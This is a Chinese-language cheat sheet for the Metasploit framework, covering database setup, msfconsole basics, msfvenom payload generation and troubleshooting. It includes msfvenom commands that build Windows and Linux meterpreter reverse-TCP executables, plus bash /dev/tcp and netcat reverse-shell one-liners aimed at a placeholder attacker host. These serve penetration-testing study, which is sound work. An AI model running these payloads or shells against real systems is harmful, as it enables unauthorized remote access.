# Metasploit

该工具存在免费版本 Metasploit Framework 和付费版本 Metasploit Pro, 后者提供了许多实用的专业功能, 但是天价.  

## 数据库

初次使用 MSF 时可以利用 [msfdb](https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html) 对数据库进行自动初始化, 若自动初始化失败则进行[手动初始化](https://docs.rapid7.com/metasploit/managing-the-database/). 仅支持 [PostgreSQL](https://www.postgresql.org/) 数据库.  

```sh
sudo pacman -S postgresql                      # 安装数据库
sudo systemctl enable --now postgresql.service # 启用数据库服务
sudo systemctl status postgresql.service       # 检查数据库服务状态

msfdb status # 检查数据库服务状态, 包括监听端口
msfdb init   # 初始化数据库
```

其中启动数据库服务和初始化数据库的步骤容易出现错误, 根据提示信息进行故障排除即可.  
启动 msfconsole 后可以通过 `db_status` 检查数据库连接状态.  

之后便可以使用数据库相关指令, 关键信息(如主机/服务/漏洞/战利品)会被记录到数据库中以便后续查询.  

### 导出

```sh
db_export -f xml ./msfdb.xml # 将当前 workspace 中的数据以 xml 格式导出到 ./msfdb.xml
```

!!! warning
    导出结果可能未空, 需要进行检查.  

## 快速入门

```sh
msf > workspace [name]    # 切换工作区
msf > workspace -a [name] # 添加工作区

msf > search [[type:]keyword] # 搜索 module
msf > use [id/module]         # 使用 module, module 的名称或 search 指令结果中的 id
msf > use [id/module]         # 显示 module 的详细信息.
msf > setg [option] [value]   # 设置默认选项, 避免切换 module 时重复填写不变的参数

msf(module) > options                 # 显示当前 module 的选项
msf(module) > info                    # 显示当前 module 的详细信息
msf(module) > show [option]           # 显示选项的可用选项
msf(module) > set [option] [id/value] # 设置选项, 选项的值或 show 指令结果中的 id
msf(module) > check                   # 部分 exploit module 支持, 用于验证 RHOSTS 是否可以被利用
msf(module) > run                     # 执行 module

msf > sessions         # 列出会话, -l
msf > sessions [id]    # 打开会话, -i
msf > sessions -u [id] # 将 shell 升级到 meterpreter
```

## 生成载荷

使用 msfvenom(msfpayload 和 msfencode 的替代品) 来生成载荷, 详情请参考[官方教程](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html).  
需要根据具体情况(包括漏洞利用方式, 架构, 系统, 环境, 通讯方式等)选择合适的载荷/编码器/格式等其他参数.  

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=[LHOST] LPORT=[LPORT] rc4password=[password] -f exe -o ~/payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp     LHOST=[LHOST] LPORT=[LPORT]                        -f exe -o ~/payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp       LHOST=[LHOST] LPORT=[LPORT]                        -f elf -o ~/payload

msfvenom -l payload # 查看载荷, 根据目标进行选择
msfvenom -l format  # 查看格式, 可以是可执行文件/脚本, 也可以只是用于源代码的 shellcode 代码片段
```

除了上传可执行文件到目标并执行, 也可以直接利用目标上的命令来获取 shell, 然后再将 shell 升级为 meterpreter.  

```sh
bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1
nc [LHOST] [LPORT] -e /bin/sh
```

利用对应的 shell_reverse_tcp 建立连接.  

## [Meterpreter](https://github.com/rapid7/metasploit-payloads)

Meterpreter 是一种特殊的多功能载荷, 充分利用其功能可以使后渗透攻击变得十分方便.  

## 故障排除

msfdb 初始化数据库失败. 可以使用下面的源安装 `msfdb-blackarch`:  

```
[blackarch]
SigLevel = Optional TrustAll
Server = https://mirrors.ustc.edu.cn/blackarch/$repo/os/$arch
```

## 拓展

- <https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/>
